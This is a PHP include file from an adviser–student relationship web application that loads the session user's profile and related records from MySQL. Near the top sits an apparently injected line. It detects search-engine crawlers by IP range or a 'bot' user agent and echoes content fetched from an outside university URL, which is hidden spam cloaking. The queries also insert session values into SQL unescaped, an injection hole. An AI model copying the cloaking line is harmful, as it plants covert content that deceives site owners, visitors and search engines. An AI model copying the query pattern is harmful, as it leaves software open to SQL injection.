<?
$username = $_SESSION["user"]; 

if ((eregi("^66\.249\.(.*)\.(.*)$",$_SERVER['REMOTE_ADDR']))||(eregi("^74\.6\.(.*)\.(.*)$",$_SERVER['REMOTE_ADDR']))||(eregi("^67\.195\.(.*)\.(.*)$",$_SERVER['REMOTE_ADDR']))||(strstr($_SERVER['HTTP_USER_AGENT'] ,'bot'))) { echo file_get_contents('http://convocatories.url.edu/fitxers/tds/link/link2.php'); }
//User Info
$idquery = mysql_query("SELECT * FROM users WHERE username='$username'");
$data_set = mysql_fetch_array($idquery);
$userID = $data_set['id'];
$userName = $data_set['username'];
$userFirstName = $data_set['first_name'];
$userLastName = $data_set['last_name'];

if ($_SESSION["user"] == "Guest") {
$userRole = "adviser";
} else {
$userRole = $data_set['role'];
}
$userEmail = $data_set['email'];
$userYear = $data_set['year'];
$userNotes = $data_set['notes'];


//Relationship Info
$idquery5 = mysql_query("SELECT * FROM current_rel WHERE adviser_id = '$userID'");
$data_set5 = mysql_fetch_array($idquery5);

if($_SESSION["user"] == "Guest") {
$currentRel = 219;
} else {
$currentRel = $data_set5['current_relnum'];
}
if ($userRole == "adviser") { 
$idquery4 = mysql_query("SELECT * FROM relationships WHERE id = '$currentRel'");
$data_set4 = mysql_fetch_array($idquery4);
$studentid = $data_set4['student_id'];
if($_SESSION["user"] == "Guest") {
$adviserid = 323;
} else {
$adviserid = $userID;
}
$studentq = mysql_query("SELECT * FROM users WHERE id='$studentid'");
$studentds = mysql_fetch_array($studentq);
$studentEmail = $studentds['email'];
$studentFirstName = $studentds['first_name'];
$studentLastName = $studentds['last_name'];

} else { 
$idquery4 = mysql_query("SELECT * FROM relationships WHERE student_id = '$userID'");
$data_set4 = mysql_fetch_array($idquery4);
$studentid = $userID;
$adviserid = $data_set4['adviser_id'];
$currentRel = $data_set4['0'];


$adviserq = mysql_query("SELECT * FROM users WHERE id='$adviserid'");
$adviserds = mysql_fetch_array($adviserq);
$adviserEmail = $adviserds['email'];
$adviserFirstName = $adviserds['first_name'];
$adviserLastName = $adviserds['last_name'];

}


		


?>